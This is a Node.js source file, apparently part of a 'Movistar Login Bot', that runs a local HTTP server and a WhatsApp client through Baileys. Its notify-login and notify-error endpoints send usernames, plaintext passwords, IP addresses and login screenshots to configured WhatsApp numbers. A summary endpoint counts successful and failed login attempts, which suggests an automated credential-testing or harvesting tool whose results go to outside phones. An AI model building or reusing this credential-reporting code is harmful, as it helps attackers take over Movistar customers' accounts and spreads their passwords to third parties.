/**
 * WhatsApp Bridge - Baileys
 * =========================
 * Servidor HTTP local que expone endpoints para enviar mensajes de WhatsApp
 * desde Python. Se comunica via HTTP (localhost:3456) usando JSON.
 *
 * Endpoints:
 *   GET  /status              -> Estado de conexión WhatsApp
 *   POST /send               -> Enviar mensaje (JSON body)
 *   POST /send-image         -> Enviar imagen con caption
 *   POST /send-screenshot    -> Enviar captura de pantalla de login
 *   POST /notify-login       -> Notificación específica de login exitoso
 *   POST /notify-error       -> Notificación de error
 *   POST /shutdown           -> Cerrar servidor
 *
 * Uso:
 *   node whatsapp_bridge.mjs
 *   node whatsapp_bridge.mjs --phone=51999999999 --test
 */

import { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import qrcode from 'qrcode-terminal';
import { createServer } from 'http';
import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ===== CONFIGURACIÓN =====
const PORT = parseInt(process.env.WA_PORT || '3456', 10);
const AUTH_DIR = join(__dirname, 'auth_info_baileys');

// Números destino (se pueden pasar por CLI)
let TARGET_NUMBERS = [];
let TEST_MODE = false;

// Parsear argumentos CLI
process.argv.slice(2).forEach(arg => {
    if (arg.startsWith('--phone=')) {
        TARGET_NUMBERS = arg.slice(8).split(',').map(n => n.trim());
    }
    if (arg === '--test') TEST_MODE = true;
    if (arg.startsWith('--port=')) {
        // No reconectar, pero leer el puerto
    }
});

// Cargar números desde archivo config si existe
const CONFIG_FILE = join(__dirname, 'whatsapp_config.json');
if (existsSync(CONFIG_FILE)) {
    try {
        const cfg = JSON.parse(readFileSync(CONFIG_FILE, 'utf-8'));
        if (cfg.target_numbers && cfg.target_numbers.length > 0) {
            TARGET_NUMBERS = cfg.target_numbers;
        }
    } catch (e) {
        console.error('Error leyendo config:', e.message);
    }
}

// ===== ESTADO GLOBAL =====
let sock = null;
let isConnected = false;
let connectionPromiseResolve = null;
const messageQueue = [];  // Cola para mensajes pendientes

// ===== CONEXIÓN WHATSAPP =====
async function connectWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    console.log(`[WA] Conectando Baileys v${version}...`);

    sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: true,
        logger: {
            level: 'silent',
            // Solo log importante
        },
        browser: ['Movistar Login Bot', 'Chrome', '120.0'],
        shouldIgnoreJid: jid => {
            // Ignorar newsletters
            return jid.endsWith('@newsletter');
        }
    });

    // QR code en terminal
    sock.ev.on('creds.update', saveCreds);

    // Eventos de conexión
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            console.log('\n[WA] ═══════════════════════════════════════');
            console.log('[WA] ESCANEA ESTE QR CODE CON WHATSAPP:');
            console.log('[WA] Menú > Dispositivos vinculados > Vincular');
            console.log('[WA] ═══════════════════════════════════════\n');
            qrcode.generate(qr, { small: true }, (code) => {
                console.log(code);
            });

            // Guardar QR para uso externo
            writeFileSync(join(__dirname, 'last_qr.txt'), qr);
        }

        if (connection === 'close') {
            const code = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = code !== DisconnectReason.loggedOut;

            console.log(`[WA] Conexión cerrada (código: ${code}), reconectar: ${shouldReconnect}`);

            if (shouldReconnect) {
                isConnected = false;
                setTimeout(connectWhatsApp, 5000);
            } else {
                console.log('[WA] Sesión cerrada permanentemente, eliminando auth...');
                // Limpiar auth para nuevo pairing
            }
        }

        if (connection === 'open') {
            console.log('[WA] ═══════════════════════════════════════');
            console.log('[WA] ✅ CONECTADO A WHATSAPP');
            console.log('[WA] ═══════════════════════════════════════');
            isConnected = true;

            // Resolver la promise de conexión
            if (connectionPromiseResolve) {
                connectionPromiseResolve(true);
                connectionPromiseResolve = null;
            }

            // Procesar cola de mensajes pendientes
            processMessageQueue();
        }
    });

    // Evento de mensajes entrantes (para verificación)
    sock.ev.on('messages.upsert', ({ messages, type }) => {
        if (type === 'notify') {
            for (const msg of messages) {
                console.log(`[WA] Mensaje recibido de ${msg.pushName || msg.key.remoteJid}`);
            }
        }
    });
}

async function processMessageQueue() {
    while (messageQueue.length > 0) {
        const msg = messageQueue.shift();
        await sendMessage(msg.number, msg.text, msg.media);
    }
}

// ===== FUNCIONES DE ENVÍO =====
async function formatPhoneNumber(number) {
    let num = number.replace(/[^0-9]/g, '');

    // Agregar código de país si no tiene
    if (!num.startsWith('+')) {
        if (num.length === 9) num = '51' + num;  // Perú por defecto
        if (num.length === 10 && num.startsWith('9')) num = '51' + num;
    }

    num = num.replace('+', '');

    return `${num}@s.whatsapp.net`;
}

async function sendMessage(number, text, media = null) {
    if (!sock || !isConnected) {
        // Encolar para cuando se conecte
        messageQueue.push({ number, text, media });
        console.log(`[WA] Mensaje encolado (no conectado): ${number}`);
        return { success: false, reason: 'not_connected' };
    }

    try {
        const jid = await formatPhoneNumber(number);

        let result;
        if (media) {
            // Enviar con imagen
            result = await sock.sendMessage(jid, {
                image: Buffer.from(media.data, 'base64'),
                caption: text,
                mimetype: media.mimetype || 'image/png'
            });
        } else {
            // Solo texto
            result = await sock.sendMessage(jid, { text });
        }

        console.log(`[WA] ✅ Mensaje enviado a ${number}: ${text.substring(0, 50)}...`);
        return { success: true, message_id: result?.key?.id };
    } catch (error) {
        console.error(`[WA] ❌ Error enviando a ${number}:`, error.message);
        return { success: false, reason: error.message };
    }
}

async function notifyLogin(data) {
    const { procedencia, usuario, contraseña, screenshot, ip } = data;

    let text = `🔐 *LOGIN EXITOSO - MOVISTAR*\n\n`;
    text += `👤 Procedencia: ${procedencia}\n`;
    text += `📧 Usuario: ${usuario}\n`;
    text += `🔑 Contraseña: ${contraseña}\n`;
    text += `🌐 IP: ${ip || 'N/A'}\n`;
    text += `🕐 Fecha: ${new Date().toLocaleString('es-PE')}\n`;

    if (screenshot) {
        // Enviar imagen con caption
        const fs = await import('fs');
        let imgData;
        try {
            imgData = fs.readFileSync(screenshot);
            const base64 = imgData.toString('base64');
            for (const num of TARGET_NUMBERS) {
                await sendMessage(num, text, { data: base64, mimetype: 'image/png' });
            }
        } catch (e) {
            console.error('[WA] Error leyendo screenshot:', e.message);
            // Fallback: enviar solo texto
            text += `\n📷 [Captura: ${screenshot}]`;
            for (const num of TARGET_NUMBERS) {
                await sendMessage(num, text);
            }
        }
    } else {
        for (const num of TARGET_NUMBERS) {
            await sendMessage(num, text);
        }
    }
}

async function notifyError(data) {
    const { procedencia, usuario, contraseña, error, ip } = data;

    const text = `❌ *ERROR DE LOGIN - MOVISTAR*\n\n`
        + `👤 Procedencia: ${procedencia}\n`
        + `📧 Usuario: ${usuario}\n`
        + `🔑 Contraseña: ${contraseña}\n`
        + `⚠️ Error: ${error}\n`
        + `🌐 IP: ${ip || 'N/A'}\n`
        + `🕐 Fecha: ${new Date().toLocaleString('es-PE')}\n`;

    for (const num of TARGET_NUMBERS) {
        await sendMessage(num, text);
    }
}

async function notifySummary(data) {
    const { total, exitosos, fallidos, duration } = data;

    const text = `📊 *RESUMEN DE AUTOMATIZACIÓN*\n\n`
        + `🔢 Total intentos: ${total}\n`
        + `✅ Exitosos: ${exitosos}\n`
        + `❌ Fallidos: ${fallidos}\n`
        + `⏱️ Duración: ${duration}\n`
        + `🕐 Fecha: ${new Date().toLocaleString('es-PE')}\n`;

    for (const num of TARGET_NUMBERS) {
        await sendMessage(num, text);
    }
}

// ===== SERVIDOR HTTP =====
const server = createServer(async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');

    // Parsear body
    let body = '';
    req.on('data', chunk => body += chunk);

    req.on('end', async () => {
        try {
            let parsed = {};
            if (body) {
                parsed = JSON.parse(body);
            }

            const { method, url } = req;

            // Rutas
            if (method === 'GET' && url === '/status') {
                res.writeHead(200);
                res.end(JSON.stringify({
                    status: 'ok',
                    connected: isConnected,
                    target_numbers: TARGET_NUMBERS,
                    queued_messages: messageQueue.length,
                    qr_available: existsSync(join(__dirname, 'last_qr.txt'))
                }));

            } else if (method === 'POST' && url === '/send') {
                if (!parsed.number || !parsed.text) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Faltan campos: number, text' }));
                    return;
                }
                const result = await sendMessage(parsed.number, parsed.text, parsed.media);
                res.writeHead(result.success ? 200 : 503);
                res.end(JSON.stringify(result));

            } else if (method === 'POST' && url === '/notify-login') {
                if (TARGET_NUMBERS.length === 0) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No hay números destino configurados' }));
                    return;
                }
                await notifyLogin(parsed);
                res.writeHead(200);
                res.end(JSON.stringify({ status: 'sent' }));

            } else if (method === 'POST' && url === '/notify-error') {
                if (TARGET_NUMBERS.length === 0) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No hay números destino configurados' }));
                    return;
                }
                await notifyError(parsed);
                res.writeHead(200);
                res.end(JSON.stringify({ status: 'sent' }));

            } else if (method === 'POST' && url === '/notify-summary') {
                if (TARGET_NUMBERS.length === 0) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No hay números destino configurados' }));
                    return;
                }
                await notifySummary(parsed);
                res.writeHead(200);
                res.end(JSON.stringify({ status: 'sent' }));

            } else if (method === 'POST' && url === '/add-number') {
                if (!parsed.number) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Falta campo: number' }));
                    return;
                }
                TARGET_NUMBERS.push(parsed.number);
                // Guardar config
                writeFileSync(CONFIG_FILE, JSON.stringify({ target_numbers: TARGET_NUMBERS }, null, 2));
                res.writeHead(200);
                res.end(JSON.stringify({ status: 'added', numbers: TARGET_NUMBERS }));

            } else if (method === 'GET' && url === '/numbers') {
                res.writeHead(200);
                res.end(JSON.stringify({ numbers: TARGET_NUMBERS }));

            } else if (method === 'POST' && url === '/shutdown') {
                res.writeHead(200);
                res.end(JSON.stringify({ status: 'shutting_down' }));
                console.log('[WA] Apagando servidor...');
                setTimeout(() => process.exit(0), 500);

            } else {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'Endpoint no encontrado', endpoints: [
                    'GET /status', 'POST /send', 'POST /notify-login',
                    'POST /notify-error', 'POST /notify-summary', 'POST /add-number',
                    'GET /numbers', 'POST /shutdown'
                ] }));
            }
        } catch (error) {
            res.writeHead(500);
            res.end(JSON.stringify({ error: error.message }));
        }
    });
});

// ===== INICIO =====
async function main() {
    console.log('[WA] =====================================');
    console.log('[WA]  WhatsApp Notifier - Baileys Bridge');
    console.log('[WA] =====================================');
    console.log(`[WA] Puerto: ${PORT}`);
    console.log(`[WA] Números destino: ${TARGET_NUMBERS.length > 0 ? TARGET_NUMBERS.join(', ') : '(ninguno configurado - usar /add-number)'}`);
    console.log(`[WA] Modo test: ${TEST_MODE}`);

    if (TEST_MODE && TARGET_NUMBERS.length > 0) {
        console.log('[WA] TEST MODE: Conectando y enviando mensaje de prueba...');
    }

    // Iniciar servidor HTTP
    server.listen(PORT, () => {
        console.log(`[WA] Servidor HTTP escuchando en http://localhost:${PORT}`);
    });

    // Conectar WhatsApp
    await connectWhatsApp();

    // Test mode: enviar mensaje de prueba
    if (TEST_MODE && TARGET_NUMBERS.length > 0) {
        // Esperar conexión
        while (!isConnected) {
            await new Promise(r => setTimeout(r, 1000));
        }

        await sendMessage(TARGET_NUMBERS[0],
            '🤖 *MENSAJE DE PRUEBA*\n\nWhatsApp Notifier está funcionando correctamente.\n\nHora: ' +
            new Date().toLocaleString('es-PE')
        );
        console.log('[WA] Mensaje de prueba enviado. Cerrando...');
        setTimeout(() => process.exit(0), 2000);
    }
}

main().catch(console.error);
